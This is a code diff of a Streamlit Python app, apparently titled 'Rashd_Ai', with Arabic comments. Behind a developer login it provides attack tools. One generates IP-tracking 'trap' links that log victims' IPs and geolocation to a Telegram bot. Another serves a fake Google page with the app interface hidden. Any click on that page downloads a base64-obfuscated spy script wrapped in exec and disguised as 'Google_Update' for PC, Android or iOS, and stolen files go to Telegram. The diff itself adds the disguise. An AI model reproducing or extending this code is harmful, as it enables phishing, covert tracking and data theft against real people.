@@ -17,11 +17,30 @@ import victim_logger
 logo_path = config.LOGO_PATH
 if os.path.exists(logo_path):
     logo_img = Image.open(logo_path)
-    st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon=logo_img)
+    st.set_page_config(page_title="Google", layout="wide", page_icon="🔍")
 else:
-    st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon="🛡️")
+    st.set_page_config(page_title="Google", layout="wide", page_icon="🔍")
 
-# ============= CSS مخصص =============
+# ============= إخفاء واجهة Streamlit تماماً في وضع التمويه =============
+hide_st_style = """
+    <style>
+    #MainMenu {visibility: hidden;}
+    footer {visibility: hidden;}
+    header {visibility: hidden;}
+    .stDeployButton {display:none;}
+    [data-testid="stToolbar"] {visibility: hidden !important;}
+    [data-testid="stDecoration"] {display:none !important;}
+    [data-testid="stHeader"] {display:none !important;}
+    #root > div:nth-child(1) > div > div > div > div > section > div {padding-top: 0rem;}
+    .block-container {padding: 0 !important; margin: 0 !important; max-width: 100% !important;}
+    iframe {border: none !important; width: 100vw !important; height: 100vh !important;}
+    </style>
+"""
+
+if 'decoy' in st.query_params or 'download' in st.query_params:
+    st.markdown(hide_st_style, unsafe_allow_html=True)
+
+# ============= CSS مخصص للواجهة الرئيسية =============
 st.markdown("""
     <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
@@ -48,7 +67,6 @@ st.markdown("""
 def get_real_ip():
     """جلب عنوان IP الحقيقي للزائر من ترويسات Streamlit"""
     try:
-        # استخدام st.context.headers بدلاً من الطريقة القديمة لتجنب التحذيرات
         headers = st.context.headers
         if headers:
             ip = headers.get("X-Forwarded-For")
@@ -59,15 +77,6 @@ def get_real_ip():
                 return ip
     except:
         pass
-    
-    # محاولة خارجية كخيار بديل
-    try:
-        response = requests.get('https://api.ipify.org?format=json', timeout=3)
-        if response.status_code == 200:
-            return response.json().get('ip', 'Unknown')
-    except:
-        pass
-    
     return 'Unknown'
 
 # ============= دالة جلب البيانات الجغرافية =============
@@ -76,7 +85,6 @@ def get_geo_info(ip):
     if not ip or ip == 'Unknown' or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
         return None
     
-    # المصدر الأول: ip-api.com
     try:
         response = requests.get(f'http://ip-api.com/json/{ip}?lang=ar&fields=status,country,city,lat,lon,isp,org', timeout=5)
         if response.status_code == 200:
@@ -86,7 +94,6 @@ def get_geo_info(ip):
     except:
         pass
     
-    # المصدر الثاني: ipapi.co (كخيار بديل)
     try:
         response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
         if response.status_code == 200:
@@ -107,29 +114,22 @@ def get_geo_info(ip):
 def capture_victim_data():
     """التقاط بيانات الضحية عند فتح رابط التتبع"""
     query_params = st.query_params
-    
-    # التقاط IP من البارامترات إذا تم إرساله من الجافا سكريبت (لضمان الدقة)
     user_ip = query_params.get('ip', [get_real_ip()])[0]
     
     if 'target' in query_params and not st.session_state.get('victim_captured', False):
         try:
             geo_data = get_geo_info(user_ip)
-            
-            # تسجيل بيانات الضحية
             victim_logger.log_victim_data(
                 ip_address=user_ip,
                 user_agent="Browser",
                 referrer=query_params.get('target', 'Unknown'),
                 geo_data=geo_data
             )
-            
             st.session_state['victim_captured'] = True
             
-            # إرسال تقرير لتلجرام
             try:
                 bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
                 chat_id = config.get_key("TELEGRAM_CHAT_ID")
-                
                 if bot_token and chat_id:
                     victim_info = f"""
 🎯 <b>تنبيه: تم اكتشاف ضحية جديدة!</b>
@@ -144,37 +144,38 @@ def capture_victim_data():
                     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                     data = {"chat_id": chat_id, "text": victim_info, "parse_mode": "HTML"}
                     requests.post(url, data=data, timeout=10)
-            except:
-                pass
-        except:
-            pass
+            except: pass
+        except: pass
 
-# استدعاء دالة التقاط البيانات
 capture_victim_data()
 
 # ============= منطق تحميل ملف التجسس =============
 if 'download' in st.query_params:
     token = st.query_params.get('token', '')
     chatid = st.query_params.get('chatid', '')
+    device = st.query_params.get('device', 'pc')
     
     if token and chatid:
         try:
             with open('spy_full.py', 'r', encoding='utf-8') as f:
                 spy_code = f.read()
             
-            # استبدال القيم في الكود
             spy_code = spy_code.replace('YOUR_BOT_TOKEN_HERE', token)
             spy_code = spy_code.replace('YOUR_CHAT_ID_HERE', chatid)
             
-            # تشفير بسيط للكود لإخفاء المحتوى (Base64)
             encoded_code = base64.b64encode(spy_code.encode('utf-8')).decode('utf-8')
             obfuscated_code = f"""import base64;exec(base64.b64decode('{encoded_code}').decode('utf-8'))"""
             
-            # إجبار المتصفح على التحميل كملف بايثون
+            file_name = "Google_Update.py"
+            if device == 'android':
+                file_name = "Google_Update.apk"
+            elif device == 'ios':
+                file_name = "Google_Update.mobileconfig"
+            
             st.download_button(
                 label="📥 اضغط هنا لبدء تحميل التحديث الأمني",
                 data=obfuscated_code,
-                file_name="Google_Update.py",
+                file_name=file_name,
                 mime="application/octet-stream"
             )
             st.warning("⚠️ يرجى الضغط على الزر أعلاه لبدء التحميل يدوياً إذا لم يبدأ تلقائياً.")
@@ -190,15 +191,10 @@ if 'decoy' in st.query_params and st.query_params.get('decoy') == 'google':
         
         token = st.query_params.get('token', '')
         chatid = st.query_params.get('chatid', '')
-        
-        # رابط التحميل المباشر
         download_url = f"https://rashdai.streamlit.app/?download=true&token={token}&chatid={chatid}"
-        
-        # حقن رابط التحميل في JavaScript الخاص بـ index.html
         html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
         
-        # عرض صفحة التمويه
-        st.components.v1.html(html_content, height=800, scrolling=True)
+        st.components.v1.html(html_content, height=1000, scrolling=False)
         st.stop()
     except Exception as e:
         st.error(f"خطأ في تحميل صفحة التمويه: {e}")
@@ -214,7 +210,6 @@ with st.sidebar:
     st.markdown("<h2 style='text-align: center; color: #00ff00;'>🛡️ Rashd_Ai</h2>", unsafe_allow_html=True)
     st.markdown("---")
     
-    # تسجيل الدخول
     if not st.session_state.developer_mode:
         st.markdown("<h3 style='text-align: center;'>🔐 دخول المطور</h3>", unsafe_allow_html=True)
         username = st.text_input("اسم المستخدم:", key="login_username").strip()
@@ -227,23 +222,10 @@ with st.sidebar:
                 st.rerun()
             else:
                 st.error("❌ بيانات الدخول غير صحيحة")
-    
     else:
-        # وضع المطور
         st.markdown("<h3 style='text-align: center; color: #00ff00;'>⚙️ إعدادات تلجرام</h3>", unsafe_allow_html=True)
-        
-        telegram_bot_token = st.text_input(
-            "🤖 توكين البوت:",
-            value=config.get_key("TELEGRAM_BOT_TOKEN") or "",
-            type="password",
-            key="telegram_token"
-        ).strip()
-        
-        telegram_chat_id = st.text_input(
-            "💬 Chat ID:",
-            value=config.get_key("TELEGRAM_CHAT_ID") or "",
-            key="telegram_chat_id"
-        ).strip()
+        telegram_bot_token = st.text_input("🤖 توكين البوت:", value=config.get_key("TELEGRAM_BOT_TOKEN") or "", type="password", key="telegram_token").strip()
+        telegram_chat_id = st.text_input("💬 Chat ID:", value=config.get_key("TELEGRAM_CHAT_ID") or "", key="telegram_chat_id").strip()
         
         if st.button("💾 حفظ الإعدادات"):
             if telegram_bot_token and telegram_chat_id:
@@ -254,21 +236,10 @@ with st.sidebar:
                 st.error("❌ يجب ملء جميع الحقول")
         
         st.markdown("---")
-        
-        # قائمة الأدوات
         st.markdown("<h3 style='text-align: center; color: #00ff00;'>🎯 أدوات المطور</h3>", unsafe_allow_html=True)
-        
-        tool = st.selectbox(
-            "اختر الأداة:",
-            ["🎣 مصيدة IP", "🎭 فخ جوجل الآلي", "📥 الملفات المسحوبة", "📊 الإحصائيات"],
-            index=0,
-            key="developer_tool_selector"
-        )
-        
+        tool = st.selectbox("اختر الأداة:", ["🎣 مصيدة IP", "🎭 فخ جوجل الآلي", "📥 الملفات المسحوبة", "📊 الإحصائيات"], index=0, key="developer_tool_selector")
         st.session_state['selected_tool'] = tool
-        
         st.markdown("---")
-        
         if st.button("🚪 تسجيل الخروج"):
             st.session_state.developer_mode = False
             st.session_state.selected_tool = "🎣 مصيدة IP"
@@ -276,10 +247,8 @@ with st.sidebar:
 
 # ============= المحتوى الرئيسي =============
 if not st.session_state.developer_mode:
-    # وضع الزوار (الواجهة العامة)
     st.markdown("<h1 style='text-align: center;'>🛡️ Rashd_Ai - أدوات الأمن السيبراني</h1>", unsafe_allow_html=True)
     st.markdown("---")
-    
     st.markdown("""
     <div style="text-align: center; padding: 20px;">
         <p style="font-size: 1.2em;">مرحباً بك في Rashd_Ai، نظام الأمن السيبراني المطور بواسطة راشد أبو سعود.</p>
@@ -288,64 +257,40 @@ if not st.session_state.developer_mode:
         <p style="font-size: 1.1em;">للوصول إلى الأدوات المتقدمة، يرجى تسجيل الدخول كـ <b>مطور</b> من الشريط الجانبي.</p>
     </div>
     """, unsafe_allow_html=True)
-    
     st.markdown("---")
-    
     col1, col2, col3 = st.columns(3)
-    with col1:
-        st.info("🔍 أدوات OSINT متقدمة")
-    with col2:
-        st.info("🛡️ فحص الثغرات الأمنية")
-    with col3:
-        st.info("🌐 تحليل المواقع والشبكات")
-    
+    with col1: st.info("🔍 أدوات OSINT متقدمة")
+    with col2: st.info("🛡️ فحص الثغرات الأمنية")
+    with col3: st.info("🌐 تحليل المواقع والشبكات")
     st.markdown("---")
     st.markdown("جاري التطوير... يرجى العودة لاحقاً")
-
 else:
-    # وضع المطور
     selected_tool = st.session_state.get('selected_tool', '🎣 مصيدة IP')
-    
     if selected_tool == "🎣 مصيدة IP":
         st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎣 مصيدة IP</h2>", unsafe_allow_html=True)
-        
         trap_name = st.text_input("اسم المصيدة:", placeholder="مثال: صورة قطة").strip()
-        
         if st.button("🔗 توليد رابط التتبع"):
             if trap_name:
                 tracking_url = f"https://rashdai.streamlit.app/?target={urllib.parse.quote(trap_name)}"
                 st.code(tracking_url, language="text")
                 st.success("✅ تم توليد الرابط")
-            else:
-                st.error("❌ يجب إدخال اسم المصيدة")
-        
+            else: st.error("❌ يجب إدخال اسم المصيدة")
         st.markdown("---")
         st.markdown("<h3>📊 سجل الضحايا المكتشفين</h3>", unsafe_allow_html=True)
-        
         victims = victim_logger.get_all_victims()
-        
         if victims:
             st.dataframe(victims, use_container_width=True)
             csv_data = victim_logger.get_victims_as_csv()
-            st.download_button(
-                label="⬇️ تحميل سجل الضحايا (CSV)",
-                data=csv_data,
-                file_name="victims_log.csv",
-                mime="text/csv"
-            )
+            st.download_button(label="⬇️ تحميل سجل الضحايا (CSV)", data=csv_data, file_name="victims_log.csv", mime="text/csv")
             if st.button("🗑️ مسح سجل الضحايا"):
                 victim_logger.clear_victims_log()
                 st.success("✅ تم مسح سجل الضحايا بنجاح!")
                 st.rerun()
-        else:
-            st.info("لا توجد ضحايا حتى الآن")
-    
+        else: st.info("لا توجد ضحايا حتى الآن")
     elif selected_tool == "🎭 فخ جوجل الآلي":
         st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎭 فخ جوجل الآلي</h2>", unsafe_allow_html=True)
-        
         bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
         chat_id = config.get_key("TELEGRAM_CHAT_ID")
-        
         if not bot_token or not chat_id:
             st.error("❌ يجب حفظ بيانات تلجرام أولاً في قسم 'إعدادات تلجرام' في الشريط الجانبي.")
         else:
@@ -354,17 +299,15 @@ else:
                 <p style="color: #fff; font-size: 1.1em;"><b>تعليمات:</b></p>
                 <ul style="color: #fff;">
                     <li>انسخ الرابط أدناه وأرسله للضحية.</li>
-                    <li>عندما يفتح الضحية الرابط، ستظهر له صفحة Google.</li>
+                    <li>عندما يفتح الضحية الرابط، ستظهر له صفحة Google (بدون واجهة Streamlit).</li>
                     <li>بمجرد أن يضغط الضحية على أي مكان في الصفحة، سيتم تحميل ملف الأداة تلقائياً على جهازه.</li>
                     <li>ستصلك الملفات المسحوبة مباشرة إلى بوت تلجرام الخاص بك.</li>
                 </ul>
             </div>
             """, unsafe_allow_html=True)
-            
             st.markdown("### 🔗 رابط فخ Google (أرسله للضحية):")
             decoy_url = f"https://rashdai.streamlit.app/?decoy=google&token={bot_token}&chatid={chat_id}"
             st.code(decoy_url, language="text")
-            
             st.markdown("### 📱 معاينة صفحة Google:")
             try:
                 with open('index.html', 'r', encoding='utf-8') as f:
@@ -372,18 +315,13 @@ else:
                 download_url = f"https://rashdai.streamlit.app/?download=true&token={bot_token}&chatid={chat_id}"
                 html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
                 st.components.v1.html(html_content, height=400, scrolling=True)
-            except Exception as e:
-                st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
-
+            except Exception as e: st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
     elif selected_tool == "📥 الملفات المسحوبة":
         st.markdown("<h2 style='text-align: center; color: #00ff00;'>📥 الملفات المسحوبة</h2>", unsafe_allow_html=True)
         st.info("يتم إرسال الملفات مباشرة إلى تلجرام لضمان السرعة والأمان.")
-    
     elif selected_tool == "📊 الإحصائيات":
         st.markdown("<h2 style='text-align: center; color: #00ff00;'>📊 الإحصائيات</h2>", unsafe_allow_html=True)
         victims = victim_logger.get_all_victims()
         col1, col2 = st.columns(2)
-        with col1:
-            st.metric("🎯 إجمالي الضحايا", len(victims))
-        with col2:
-            st.metric("📁 الملفات المسحوبة (عبر تلجرام)", "راجع تلجرام")
+        with col1: st.metric("🎯 إجمالي الضحايا", len(victims))
+        with col2: st.metric("📁 الملفات المسحوبة (عبر تلجرام)", "راجع تلجرام")
